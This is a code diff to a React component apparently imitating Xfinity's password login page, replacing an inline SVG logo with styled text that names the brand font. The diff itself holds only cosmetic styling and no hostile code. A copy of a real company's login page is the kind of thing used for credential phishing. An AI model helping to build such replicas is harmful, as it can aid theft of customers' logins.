@@ -75,9 +75,7 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
       <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', flex: 1, padding: '3rem 1.5rem 2rem', maxWidth: '480px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
         {/* Xfinity Logo */}
         <div style={{ marginBottom: '2rem' }}>
-          <svg width="91" height="20" viewBox="0 0 107 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M16.845 0L12.558 5.55 8.27 0H0l8.998 11.55L0 23.1h8.27l4.288-5.55 4.287 5.55h8.27l-8.998-11.55L25.115 0h-8.27zM27.07 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S28.07 0 30.01 0zM40.34 3.8v2.6c1.48-1.95 3.63-3.1 6.21-3.1 4.31 0 7.24 2.83 7.24 7.55V23.1h-5.88V12.08c0-2.58-1.44-4.03-3.65-4.03-2.37 0-3.92 1.53-3.92 4.36V23.1h-5.88V3.8h5.88zM56.31 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S57.31 0 59.25 0zM73.97 8.1h-4.45V14c0 3.15 1.2 4.05 3.28 4.05.48 0 .93-.05 1.17-.12v5.12c-.56.15-1.42.25-2.37.25-5.22 0-7.96-2.5-7.96-8.2V8.1h-3.2V3.8h.88c2.12 0 3.12-1.05 3.12-3.15V.38l4.6-.38v3.8h4.93v4.3zM84.86 24c-2.38 0-4.33-.55-6.18-1.55l1.93-4.2c1.28.7 2.65 1.2 3.98 1.2 1.88 0 2.95-.88 3.78-2.68l.2-.43-8.27-12.54h6.28l4.82 8.85L95.6 3.8h6.02L92.13 22.1C90.58 23.45 88.24 24 84.86 24zM106.23 0a.77.77 0 1 1 0 1.54.77.77 0 0 1 0-1.54z" fill="#6B6B76"/>
-          </svg>
+          <span aria-label="xfinity" style={{ fontFamily: "XfinityBrown, 'Helvetica Neue', Arial, sans-serif", fontWeight: 700, fontSize: '24px', color: '#6B6B76', lineHeight: 1, letterSpacing: '-0.02em' }}>xfinity</span>
         </div>
 
         {/* Email display */}
